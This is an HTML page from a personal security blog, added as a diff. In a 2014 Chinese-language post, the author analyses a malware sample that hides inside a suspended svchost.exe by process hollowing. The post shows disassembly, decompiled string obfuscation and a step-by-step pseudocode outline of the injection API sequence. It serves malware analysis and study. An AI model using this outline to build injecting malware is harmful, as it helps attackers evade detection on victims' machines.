@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <title>inject process analyze and code | Anhkgg&#39;s website | 内核研究 | 逆向分析 | 漏洞分析挖掘 | Windows Kernel | Rootkit | Reverse Engineer | Expolit</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1. 起因某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="inject process analyze and code">
+<meta property="og:url" content="http://anhkgg.github.io/inject-process-analyze-and-code/index.html">
+<meta property="og:site_name" content="Anhkgg's website | 内核研究 | 逆向分析 | 漏洞分析挖掘 | Windows Kernel | Rootkit | Reverse Engineer | Expolit">
+<meta property="og:description" content="1. 起因某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。">
+<meta property="og:updated_time" content="2016-07-07T15:17:29.010Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="inject process analyze and code">
+<meta name="twitter:description" content="1. 起因某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。">
+  
+    <link rel="alternative" href="/atom.xml" title="Anhkgg&#39;s website | 内核研究 | 逆向分析 | 漏洞分析挖掘 | Windows Kernel | Rootkit | Reverse Engineer | Expolit" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://avatars0.githubusercontent.com/u/9443285?v=3&amp;s=460" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">Anhkgg</a></h1>
+		</hgroup>
+
+		
+		<p class="header-subtitle">Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</p>
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>Menu</li>
+						<li>Tags</li>
+						
+						<li>Links</li>
+						
+						
+						<li>About</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">主页</a></li>
+				        
+							<li><a href="/archives">所有文章</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="https://github.com/anhkgg" title="github">github</a>
+					        
+								<a class="weibo" target="_blank" href="http://weibo.com/u/5829043072" title="weibo">weibo</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+								<a class="mail" target="_blank" href="mailto:anhkgg@163.com" title="mail">mail</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/010editor/" style="font-size: 10px;">010editor</a> <a href="/tags/GS/" style="font-size: 10px;">GS</a> <a href="/tags/PE/" style="font-size: 10px;">PE</a> <a href="/tags/RPC/" style="font-size: 10px;">RPC</a> <a href="/tags/Windbg调试/" style="font-size: 10px;">Windbg调试</a> <a href="/tags/c/" style="font-size: 10px;">c++</a> <a href="/tags/cookie/" style="font-size: 10px;">cookie</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/hctf/" style="font-size: 10px;">hctf</a> <a href="/tags/inject-process/" style="font-size: 15px;">inject process</a> <a href="/tags/pyspider/" style="font-size: 10px;">pyspider</a> <a href="/tags/reverse/" style="font-size: 20px;">reverse</a> <a href="/tags/sctf/" style="font-size: 10px;">sctf</a> <a href="/tags/ssctf/" style="font-size: 15px;">ssctf</a> <a href="/tags/unpack/" style="font-size: 10px;">unpack</a> <a href="/tags/upx/" style="font-size: 10px;">upx</a> <a href="/tags/writeup/" style="font-size: 10px;">writeup</a> <a href="/tags/远程过程调用/" style="font-size: 10px;">远程过程调用</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://navisec.it/">NaviSec.it – 纳威安全导航</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">Anhkgg</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="https://avatars0.githubusercontent.com/u/9443285?v=3&amp;s=460" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">Anhkgg</h1>
+			</hgroup>
+			
+			<p class="header-subtitle">Windows Kernel/Rootkit/Reverse Engineer/Expolit/内核研究/逆向分析/漏洞分析挖掘</p>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">主页</a></li>
+		        
+					<li><a href="/archives">所有文章</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="https://github.com/anhkgg" title="github">github</a>
+			        
+						<a class="weibo" target="_blank" href="http://weibo.com/u/5829043072" title="weibo">weibo</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+						<a class="mail" target="_blank" href="mailto:anhkgg@163.com" title="mail">mail</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-inject-process-analyze-and-code" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/inject-process-analyze-and-code/" class="article-date">
+  	<time datetime="2014-11-25T09:45:00.000Z" itemprop="datePublished">2014-11-25</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      inject process analyze and code
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/inject-process/">inject process</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/security/">security</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="1-起因"><a href="#1-起因" class="headerlink" title="1. 起因"></a><strong>1. 起因</strong></h1><p>某次卡饭hips浏览中，看到某高大上进程注入方式(主要是某人头发长)，惊为天人，技术堪称猥琐之王(抬高了？)，额。。。不捧了。由于没有样本，也没有搜索到资料，只能作罢。<br>某天，突然来了兴致，要分析个样本，随便在卡饭样本区下了个感觉挺啥啥的样本，一分析，你妹，咋这么熟悉呢，居然就是同类的进程注入，然后某人就有了下面的文章。</p>
+<a id="more"></a>
+<h1 id="2-分析与实现"><a href="#2-分析与实现" class="headerlink" title="2. 分析与实现"></a><strong>2. 分析与实现</strong></h1><h2 id="2-1-PEID"><a href="#2-1-PEID" class="headerlink" title="2.1 PEID"></a><strong>2.1 PEID</strong></h2><p>壳信息：Microsoft Visual C++ v6.0，无壳<br>文件名：bbs.exe<br>既然无壳，直接ida先分析一下，遇到无法分析的OD继续调试。</p>
+<h2 id="2-2-分析"><a href="#2-2-分析" class="headerlink" title="2.2 分析"></a><strong>2.2 分析</strong></h2><p>打开IDA，拖入文件，找到主函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">.text:0040A720 ; int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)</div><div class="line">.text:0040A720</div><div class="line">.text:0040A720                 push    ebp</div><div class="line">.text:0040A721                 mov     ebp, esp</div><div class="line">.text:0040A723                 push    ecx</div><div class="line">.text:0040A724                 call    sub_408BE0</div><div class="line">.text:0040A729                 mov     esp_4FEE68, esp</div><div class="line">.text:0040A72F                 mov     esp_4FEE6C, ebp</div><div class="line">.text:0040A735                 call    sub_408929//主功能函数</div><div class="line">.text:0040A73A                 mov     [ebp+var_4], eax</div><div class="line">.text:0040A73D                 mov     eax, [ebp+var_4]</div><div class="line">.text:0040A740                 mov     esp, ebp</div><div class="line">.text:0040A742                 pop     ebp</div><div class="line">.text:0040A743                 retn    10h</div><div class="line">.text:0040A743 _WinMain@16     endp</div></pre></td></tr></table></figure></p>
+<p>没什么东西，继续sub_408929：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">.text:00408929 sub_408929      proc near               ; CODE XREF: WinMain(x,x,x,x)+15p</div><div class="line">.text:00408929                 cld</div><div class="line">.text:0040892A                 fninit</div><div class="line">.text:0040892C                 call    myNewObj</div><div class="line">.text:00408931                 push    offset sub_406C2A</div><div class="line">.text:00408936                 mov     eax, 3</div><div class="line">.text:0040893B                 call    myInitFunc</div><div class="line">.text:00408940                 add     esp, 4</div><div class="line">.text:00408943                 call    sub_40101D//这几个都是些无用函数，多半是花指令</div><div class="line">.text:00408948                 call    sub_406B84</div><div class="line">.text:0040894D                 call    sub_406BDB</div><div class="line">.text:00408952                 call    sub_401000</div><div class="line">.text:00408957                 call    sub_406BBE</div><div class="line">.text:0040895C                 call    sub_406BA1</div><div class="line">.text:00408961                 call    sub_406BF8</div><div class="line">.text:00408966                 call    myReleaseFile//文件释放，可能是功能文件</div><div class="line">.text:0040896B                 push    eax             ; uExitCode</div><div class="line">.text:0040896C                 call    nullsub_1</div><div class="line">.text:00408971                 call    j_myExit</div><div class="line">.text:00408976                 add     esp, 4</div><div class="line">.text:00408979                 retn</div><div class="line">.text:00408979 sub_408929      endp</div></pre></td></tr></table></figure></p>
+<p>其他函数都没有什么重要的代码，接着看看myReleaseFile，代码太多，直接f5看看整体流程，结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">int __cdecl myReleaseFile()</div><div class="line">&#123;</div><div class="line">  lpMem = &quot;QzpcUHJvZ3JhbSBGaWxlc1xDb21tb24gRmlsZXNcTWljcm9zb2Z0IFNoYXJlZFxNU0luZm9ca2trLnR4dA==&quot;;// C:\Program Files\Common Files\Microsoft Shared\MSInfo\kkk.txt</div><div class="line">  v12 = (void *)myBase64Dec(&amp;lpMem);</div><div class="line">  if ( lpMem )</div><div class="line">    j_myIsInMyImg(lpMem);</div><div class="line">  v1 = (int)v12;</div><div class="line">  if ( !v12 )</div><div class="line">    v1 = (int)dword_416285;</div><div class="line">  pszPath = (LPCSTR)myFormat(ebp0, 1, (unsigned int)v1, 0x80000005u);//  C:\Program Files\Common Files\Microsoft Shared\MSInfo\kkk.txt</div><div class="line">  v2 = (int)v12;</div><div class="line">  if ( v12 )</div><div class="line">    j_myIsInMyImg(v12);</div><div class="line">  v10 = (int *)&amp;v6;</div><div class="line">  v3 = PathFileExistsA(pszPath);</div><div class="line">  if ( (void **)v10 != &amp;v6 )</div><div class="line">    v3 = myRunError(v2, 6);</div><div class="line">  v9 = v3;</div><div class="line">  if ( pszPath )</div><div class="line">    j_myIsInMyImg((void *)pszPath);</div><div class="line">  if ( v9 == 1 )</div><div class="line">  &#123;</div><div class="line">    lpMem = &quot;我是一个中国人&quot;;//恩，很爱国</div><div class="line">    v12 = &quot;34,85,10,1D,04,D1,CF,42,DF,A4,B0,&quot;;</div><div class="line">    pszPath = (LPCSTR)myDecStr(&amp;v12, &amp;lpMem);   // 字符串解密，&quot;svchost.exe&quot;</div><div class="line">    if ( v12 )</div><div class="line">      j_myIsInMyImg(v12);</div><div class="line">    if ( lpMem )</div><div class="line">      j_myIsInMyImg(lpMem);</div><div class="line">    v4 = j_myNewBuf(ebp0, 0x10u);</div><div class="line">    v10 = (int *)v4;</div><div class="line">    *(_DWORD *)v4 = 0;</div><div class="line">    *((_DWORD *)v4 + 1) = 0;</div><div class="line">    *((_DWORD *)v4 + 2) = 0;</div><div class="line">    *((_DWORD *)v4 + 3) = 0;</div><div class="line">    v9 = 0;</div><div class="line">    v8 = 0;</div><div class="line">    v7 = 0;</div><div class="line">    v6 = &amp;unk_4162BE;</div><div class="line">    myWork(&amp;v6, &amp;v7, 0, &amp;pszPath, 1, 0, 0, 0, 0, &amp;v10, 0);//注入进程的功能，代码中很多混淆</div><div class="line">    if ( v6 )</div><div class="line">      j_myIsInMyImg(v6);</div><div class="line">    if ( v7 )</div><div class="line">      j_myIsInMyImg(v7);</div><div class="line">    if ( pszPath )</div><div class="line">      j_myIsInMyImg((void *)pszPath);</div><div class="line">    j_myIsInMyImg(v10);</div><div class="line">    sub_40574F();</div><div class="line">  &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>由于在myWork中太多混淆，IDA无力，转战OD，看到高大上的进程注入。由于代码混淆，太多PE操作，而且IDA没有有效识别内存拷贝函数，给分析带来了较大困难。<br>下面是主要的进程注入用到的函数表，myWork中调用这些关键函数，都是通过该函数表调用，里面通过loaddll+getprocaddress获取到函数地址，返回，然后调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">.data:004FB87F myLocalSize1    dd offset myLocalSize   ; DATA XREF: .text:00402CACr</div><div class="line">.data:004FB883 myRtlMoveMemory1 dd offset myRtlMoveMemory ; DATA XREF: .text:00402F32r</div><div class="line">.data:004FB887 myLocalSize2    dd offset sub_4089DC    ; DATA XREF: .text:00403303r</div><div class="line">.data:004FB88B myRtlMoveMemory2 dd offset sub_4089F2   ; DATA XREF: .text:00403701r</div><div class="line">.data:004FB88F myLocalSize3    dd offset sub_408A08    ; DATA XREF: .text:00403A06r</div><div class="line">.data:004FB893 myCreateProcessA dd offset sub_408A1E   ; DATA XREF: .text:00403DEEr</div><div class="line">.data:004FB897 myGetThreadContext dd offset sub_408A34 ; DATA XREF: sub_403FC0+C8r</div><div class="line">.data:004FB89B myReadProcessMemory dd offset sub_408A4A ; DATA XREF: sub_403FC0+2E9r</div><div class="line">.data:004FB89F myZwUnmapViewOfSection dd offset sub_408A60 ; DATA XREF: sub_403FC0+335r</div><div class="line">.data:004FB8A3 myVirtualAllocEx dd offset sub_408A76   ; DATA XREF: sub_403FC0+3ACr</div><div class="line">.data:004FB8A7 myWriteProcessMemory dd offset sub_408A8C ; DATA XREF: sub_403FC0+43Fr</div><div class="line">.data:004FB8AB myLocalSize5    dd offset sub_408AA2    ; DATA XREF: sub_403FC0+9A7r</div><div class="line">.data:004FB8AF myRtlMoveMemory_0 dd offset sub_408AB8  ; DATA XREF: sub_403FC0+B0Er</div><div class="line">.data:004FB8B3 myVirtualProtectEx dd offset sub_408ACE ; DATA XREF: sub_403FC0+D60r</div><div class="line">.data:004FB8B7 myWriteProcessMemory_0 dd offset sub_408AE4 ; DATA XREF: sub_403FC0+DD2r</div><div class="line">.data:004FB8BB mySetThreadContext dd offset sub_408AFA ; DATA XREF: sub_403FC0+FA8r</div><div class="line">.data:004FB8BF myResumeThread  dd offset sub_408B10    ; DATA XREF: sub_403FC0+1172r</div><div class="line">.data:004FB8C3 myWaitForSingleObject dd offset sub_408B26 ; DATA XREF: sub_403FC0+11ADr</div><div class="line">.data:004FB8C7 myCloseHandle_  dd offset sub_408B3C    ; DATA XREF: sub_403FC0+11E6r</div><div class="line">.data:004FB8CB myGetEnvironmentVariableA dd offset sub_408B52</div><div class="line">.data:004FB8CF myTerminateProcess dd offset sub_408B68 ; DATA XREF: sub_4053DE+1Er</div><div class="line">.data:004FB8D3 myReadFileEx    dd offset sub_408B7E    ; DATA XREF: sub_405FAA+1E2r</div><div class="line">.data:004FB8D7 myGetFileSize   dd offset sub_408B94    ; DATA XREF: sub_4063B0+DFr</div><div class="line">.data:004FB8DB myCloseHandle   dd offset sub_408BAA    ; DATA XREF: sub_4064C4+1Dr</div><div class="line">.data:004FB8DF myLocalFree     dd offset sub_408BC0    ; DATA XREF: sub_4065D9+541r</div></pre></td></tr></table></figure></p>
+<p>获取函数的代码结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.text:004089B0 myLocalSize     proc near               ; CODE XREF: .text:00402CACp</div><div class="line">.text:004089B0                                         ; DATA XREF: .data:myLocalSize1o</div><div class="line">.text:004089B0                 push    offset myLocalSize1 ; int</div><div class="line">.text:004089B5                 push    offset aLocalsize ; &quot;LocalSize&quot;</div><div class="line">.text:004089BA                 push    offset aKernel32 ; &quot;kernel32&quot;</div><div class="line">.text:004089BF                 call    myGetProc</div><div class="line">.text:004089C4                 jmp     eax</div><div class="line">.text:004089C4 myLocalSize     endp</div></pre></td></tr></table></figure></p>
+<p>最后基本总结了myWork的代码逻辑，也一窥了进程注入的猥琐：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">CreateProcessA(0, &quot;svchost.exe&quot;, 0, 0, 0, 4/*CREATE_SUSPENDED*/, 0, 0, &amp;sa, &amp;pi );//按suspend创建进程，这样主线程就会挂起，等待后面的宰割</div><div class="line">GetThreadContext(pi.hThread, &amp;context);</div><div class="line">ReadProcessMemory(pi.hProcess, 0x7ffde008/*peb-&gt;ImageBaseAddress*/, buf, 4, &amp;size); /*获取到的是img基地址 peb-&gt;ImageBaseAddress*/</div><div class="line">ZwUnmapViewOfSection(pi.hProcess, buf);//这里有个bug，buf传递方式错误，导致无法unmap，应该是&amp;buf</div><div class="line">VirtualAllocEx(pi.hProcess, 0x400000, size, MEM_COMMIT|MEM_RESERVE/*0x3000*/, PAGE_READWRITE/**4/ );</div><div class="line">//解析PE文件，写入进程对应位置</div><div class="line">WriteProcessMemory(pi.hProcess, 0x400000, buf, 0x1000, &amp;size);//写入头部</div><div class="line">for(i =0 ;i&lt;num_of_sec; i++)</div><div class="line">&#123;</div><div class="line">    WriteProcessMemory(pi.hProcess, 0x400000+sec[i].va, buf, sec[i].size, &amp;size);//.text, .rdata, .data</div><div class="line">    VirtualProtectEx(pi.hProcess, 0x400000+sec[i].va, sec[i].size, NewProtect, &amp;oldProtect);//PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE</div><div class="line">&#125;</div><div class="line">//重写eop</div><div class="line">//重写基地址</div><div class="line">WriteProcessMemory(pi.hProcess, 0x7ffde008/*peb-&gt;ImageBaseAddress*/, MyBaseAddr, 4, &amp;size);//写入我的img 基地址 0x400000</div><div class="line">SetThreadContext(pi.hProcess, context);//恢复</div><div class="line">ResumeThread(pi.hThread);//恢复线程执行</div></pre></td></tr></table></figure></p>
+<h1 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a><strong>3. 总结</strong></h1><p>本来打算完整分析一下的，在分析到进程注入时，由于自己代码实现中，遇到了一些问题，调试无语，eop和基地址都改写了，那么就是映射section遇到问题，终于修改成<br>直接pe完整写入宿主进程，成功执行了注入进程的功能。<br>所以，后面也没时间具体分析样本的功能了。<br>测试了该方式，无法过掉主防，在WriteProcessMemory就会被拦截，所以该方式基本只是作为技术研究，直接使用，还需努力。</p>
+<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a><strong>4. 参考</strong></h1><p>[1] <a href="http://www.cnblogs.com/lbq1221119/archive/2008/07/22/1248706.html" target="_blank" rel="external">http://www.cnblogs.com/lbq1221119/archive/2008/07/22/1248706.html</a><br>[2] <a href="http://blog.csdn.net/darthas/article/details/12569443" target="_blank" rel="external">http://blog.csdn.net/darthas/article/details/12569443</a></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/some-thing-in-c-reverse/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          some thing in c++ reverse
+        
+      </div>
+    </a>
+  
+  
+    <a href="/inject-process-analyze 2/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">inject process analyze 2</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+<div class="share_jia">
+	<!-- JiaThis Button BEGIN -->
+	<div class="jiathis_style">
+		<span class="jiathis_txt">Share to: &nbsp; </span>
+		<a class="jiathis_button_facebook"></a> 
+    <a class="jiathis_button_twitter"></a>
+    <a class="jiathis_button_plus"></a> 
+    <a class="jiathis_button_tsina"></a>
+		<a class="jiathis_button_cqq"></a>
+		<a class="jiathis_button_douban"></a>
+		<a class="jiathis_button_weixin"></a>
+		<a class="jiathis_button_tumblr"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jtico jtico_jiathis" target="_blank"></a>
+	</div>
+	<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js?uid=1405949716054953" charset="utf-8"></script>
+	<!-- JiaThis Button END -->
+</div>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="inject-process-analyze-and-code/" data-title="inject process analyze and code" data-url="http://anhkgg.github.io/inject-process-analyze-and-code/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"anhkgg"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+    	<div class="footer-left">
+    		&copy; 2016 Anhkgg
+    	</div>
+      	<div class="footer-right">
+      		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
+      	</div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: true,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+<script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F1356cee6585113888657f9b35b0a8295' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+
+  </div>
+</body>
+</html>
